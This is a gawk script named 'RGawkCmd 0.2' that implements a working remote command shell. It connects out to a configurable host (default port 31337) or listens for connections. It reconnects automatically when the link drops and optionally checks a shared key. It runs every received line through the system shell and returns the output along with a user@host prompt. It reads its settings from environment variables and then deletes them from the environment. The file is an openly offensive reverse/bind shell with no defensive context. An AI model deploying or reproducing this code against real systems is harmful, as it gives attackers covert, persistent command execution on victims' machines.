#!/usr/bin/gawk -f
BEGIN {
	CONFIG_FROM_ENV=1
	RGC_KEY = 0

	if (CONFIG_FROM_ENV == 1) {
		if (length(ENVIRON["RGC_HOST"]) > 0) {
			HOST = ENVIRON["RGC_HOST"]
			delete ENVIRON["RGC_HOST"]
		}

		if (length(ENVIRON["RGC_RPORT"]) > 0) {
			RPORT = ENVIRON["RGC_RPORT"]
			delete ENVIRON["RGC_RPORT"]
		}

		if (length(ENVIRON["RGC_LPORT"]) > 0) {
			LPORT = ENVIRON["RGC_LPORT"]
			delete ENVIRON["RGC_LPORT"]
		}

		if (length(ENVIRON["RGC_KEY"]) > 0) {
			RGC_KEY = ENVIRON["RGC_KEY"]
			delete ENVIRON["RGC_KEY"]	
		}

		if (length(ENVIRON["RGC_MODE"]) > 0) {
			RGC_MODE = ENVIRON["RGC_MODE"];
			delete ENVIRON["RGC_MODE"];
		}
	}


	if (RGC_MODE == "")
		RGC_MODE = "remote"

	if (RGC_MODE == "listen") {
		#make sure the listen string makes sense
	} else if (RGC_MODE == "remote") {
		#make sure the remote string makes sense
	} else {
		print "ERROR: " RGC_MODE " is not a valid mode."
		exit
	}

	if (HOST == "")
		HOST="localhost"

	if (RPORT == "")
		RPORT=31337

	if (LPORT == "") {
		if (RGC_MODE == "remote") {		
			LPORT=0
		} else {
			LPORT=31337
		}
	}


	if (RGC_KEY != 0) {
		AUTHED=0
	} else {
		AUTHED=1
	}


	#Open socket
	#/inet/tcp/local_port/remote_host/remote_port
	if (RGC_MODE == "remote") {
		CONSTRING = LPORT "/" HOST "/" RPORT
	} else if (RGC_MODE == "listen") {
		CONSTRING = LPORT "/0/0"
	} else {
		print "ERROR: Ya done messed it up real good son."
		exit
	}


	print rgc_version() " starting up"

	RCON = "/inet/tcp/" CONSTRING

#	if (AUTHED == 1) {
#		printf("rgawkcmd 0.1 :: athis\n") |& RCON
#	}
	
	while (1) {
		readstat = RCON |& getline


		if (readstat != 1 || RCON == 0) {
			#connection has closed
			print "Connection closed. Trying to reopen."
			close(RCON)
			if (RGC_KEY != 0) {
				AUTHED = 0
			}
			RCON = "/inet/tcp/" CONSTRING
			continue
		}
	

		if (length($0) > 0) {
			if (AUTHED == 1) {
				if ($1 == ":") {
					#side-channel command
					sidecmd = $0
					sub(/^\: /, "", sidecmd)

					print "sidecmd: '" sidecmd "'"
					print "1: " $1
					print "2: " $2
					print "3: " $3

					if ($2 == "quit") { 
						print rgc_version() " shutting down." |& RCON
						exit
					} else if ($2 == "lport") {
						LPORT = $3
						HOST = 0
						RPORT = 0
						print rgc_version() " changing to listen on port " LPORT |& RCON
						close(RCON)					
						CONSTRING = LPORT "/0/0"
						RCON = 0
					} else if ($2 == "rport") {
						RPORT = $3
						print rgc_version() " remote connecting to port " $3 |& RCON
						close(RCON)
						CONSTRING = LPORT "/" HOST "/" RPORT
						RCON = 0
					} else if ($2 == "rhost") {
						if (length($4) > 0) {
							RPORT = $4
						}
						print rgc_version() " connecting to " $3 "/" RPORT |& RCON
						HOST = $3
						CONSTRING = LPORT "/" HOST "/" RPORT
						RCON = 0
					}
					#print "side channel commands not yet supported" |& RCON	
				}
				else {
					DataPipe = ($0)
				        while ((DataPipe | getline) > 0) {
				                print $0 |& RCON
				        }
					close(DataPipe)
				}
			} else {
				if ($0 == RGC_KEY) {
					AUTHED = 1
					printf("rgawkcmd 0.1 :: authenticated\n") |& RCON
				}
			}
		}


		if (AUTHED == 1) {
			whoami = ("whoami")
			whoami | getline c_user
			close(whoami)
	
			hostname = ("hostname")
			hostname | getline c_host
			close(hostname)	
	
			datetime = ("date \"+%F %T-%Z\"")
			datetime | getline c_time
			close(datetime)

			printf("\n%s\n%s@%s > ", c_time, c_user, c_host) |& RCON

		}
	}
}

function rgc_version () {
	return "RGawkCmd 0.2"
}
